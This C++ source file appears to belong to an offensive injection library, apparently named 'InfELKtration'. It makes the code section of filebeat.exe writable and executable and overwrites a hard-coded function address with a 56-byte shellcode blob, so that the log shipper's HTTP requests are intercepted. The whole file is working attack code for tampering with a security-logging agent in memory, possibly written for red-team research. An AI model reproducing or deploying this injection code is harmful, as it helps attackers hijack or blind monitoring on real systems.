#include "pch.h"
#include "InfELKtrationInjectLib.h"
#include "Logger.h"
#include "Patcher.h"
#include "HttpIntercept.h"

#include <iostream>

unsigned char http_intercept_bin[] = {
  0x48, 0x8b, 0x54, 0x24, 0x18, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0x48, 0x8b,
  0x09, 0x4c, 0x8b, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x49, 0xc7, 0xc1,
  0x00, 0x01, 0x42, 0x66, 0x41, 0xff, 0x11, 0x48, 0x8b, 0x44, 0x24, 0x38,
  0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0x54, 0x24, 0x28, 0x49, 0xc7,
  0xc0, 0xc0, 0xcc, 0xa8, 0x00, 0x41, 0xff, 0xe0
};
unsigned int http_intercept_bin_len = 56;

void injectMain() {
	PatchTarget execHttpRequest;

	Logger::Info("Initializing injection code");

	// configure function table
	if (!Patcher::ConfigureFunctionTable()) return;

	// enable W&X on filebeat.exe!.text
	LPVOID textBase = (LPVOID)0x401000;
	SIZE_T textSize = 0x2137000;

	if (!Patcher::EnableRwxOnSection(textBase, textSize)) return;

	execHttpRequest.targetAddr = (LPVOID)0xa8ccb1;
	execHttpRequest.patchSize = http_intercept_bin_len;
	execHttpRequest.patchContents = (unsigned char*)http_intercept_bin;

	Logger::Info("Installing HTTP interception patch");
	if (Patcher::InstallPatch(&execHttpRequest)) {
		Patcher::NopRange((intptr_t)execHttpRequest.targetAddr + 13, 2);
		Logger::Info("Successfully installed HTTP interception patch");
	}
	else {
		Logger::Error("Failed to install HTTP interception patch");
	}
	
	Logger::Info("Finished initialization");
}